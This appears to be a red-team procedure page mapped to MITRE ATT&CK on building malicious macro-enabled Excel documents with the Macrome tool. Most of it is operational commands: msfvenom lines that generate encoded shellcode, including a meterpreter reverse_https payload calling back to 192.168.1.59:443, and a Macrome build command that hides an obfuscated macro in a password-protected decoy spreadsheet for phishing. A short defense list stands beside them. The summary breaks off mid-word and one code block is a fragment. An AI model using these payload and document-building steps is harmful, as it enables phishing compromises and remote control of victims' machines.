---
id: 60925aa7-3fcd-4d24-b2c8-23fe540b07bb
name: Malicious Macro-enabled Excel Documents with Macrome
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.242247+00:00'
updated_at: '2023-04-10T20:36:50.005642+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Scripting|T1064 - Scripting]]'
sub_techniques:
- '[[Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
- '[[Office - Attacks]]'
- '[[XLM - Macrome]]'
commands:
- '[[Build macro with decoy document]]'
- '[[Create custom shellcode]]'
- '[[Create default calc payload]]'
- '[[Create MSF shellcode]]'
---

# Malicious Macro-enabled Excel Documents with Macrome

## Summary

Malicious Macro-enabled Excel Documents with Macrome is a technique used by attackers to gain initial access to a target system. This technique involves creating a malicious Excel document that is enabled with macros using the Macrome tool. When the document is opened, the macros are executed, whic

## Description

# Description

Malicious Macro-enabled Excel Documents with Macrome is a technique used by attackers to gain initial access to a target system. This technique involves creating a malicious Excel document that is enabled with macros using the Macrome tool. When the document is opened, the macros are executed, which can lead to the execution of additional malicious code on the system. This technique is commonly used in phishing attacks, where the attacker sends an email with the malicious document attached, enticing the user to open it.

From a technical perspective, this technique involves the use of the Macrome tool, which allows the attacker to create a macro-enabled Excel document that can be used to execute code on the target system. The tool provides a user-friendly interface that allows the attacker to customize the macro code and the payload that will be executed. From a business perspective, this technique can lead to the compromise of sensitive data, financial loss, and damage to the organization's reputation.

 

## Requirements

1. Access to the target system

1. Ability to create a macro-enabled Excel document using Macrome

 

## Defense

1. Disable macros in Microsoft Office applications, unless they are required for specific business purposes

1. Use email filters to block emails with attachments that have macro-enabled documents

1. Educate users about the risks of opening attachments from unknown sources

 

## Objectives

1. Gain initial access to the target system

1. Execute additional malicious code on the target system

 

# Instructions

1. The commands above show how to use Macrome to create malicious macro-enabled Excel documents. The first set of commands generate payloads for different architectures and encoding schemes. The second set of commands uses Macrome to build the actual malicious documents. The "--decoy-document" flag specifies the name of the decoy document that will be used to hide the malicious macro. The "--payload" flag specifies the payload to be used for 32-bit systems, while the "--payload64-bit" flag specifies the payload to be used for 64-bit systems. The "--payload-type Macro" flag specifies that the payload is a VBA macro. The "--payload" flag specifies the path to the VBA macro file. The "--output-file-name" flag specifies the name of the output file. The "--password" flag specifies the password to be used to protect the document.

 



**Code**: [[# NOTE: The payload cannot contains NULL bytes.

#]]



> The commands above demonstrate how to create malicious macro-enabled Excel documents using Macrome. The first set of commands generates payloads for different architectures and encoding schemes. The second set of commands uses Macrome to build the actual malicious documents. The decoy document is used to hide the malicious macro, and the payload is specified for both 32-bit and 64-bit systems. The payload type is specified as a VBA macro, and the output file is protected with a password. The resulting Excel document will execute the malicious macro when opened, allowing the attacker to execute arbitrary code on the victim's machine.



**Command** ([[Create default calc payload]]):

```bash
msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
```





**Command** ([[Create custom shellcode]]):

```bash
msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
```





**Command** ([[Create MSF shellcode]]):

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin
```





**Command** ([[Build macro with decoy document]]):

```bash
Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Scripting|T1064 - Scripting]]

### Sub-Techniques

- [[Windows Command Shell|T1059.003 - Windows Command Shell]]

## Commands Used

- [[Build macro with decoy document]]
- [[Create custom shellcode]]
- [[Create default calc payload]]
- [[Create MSF shellcode]]

## Tags

- [[Office - Attacks]]
- [[XLM - Macrome]]


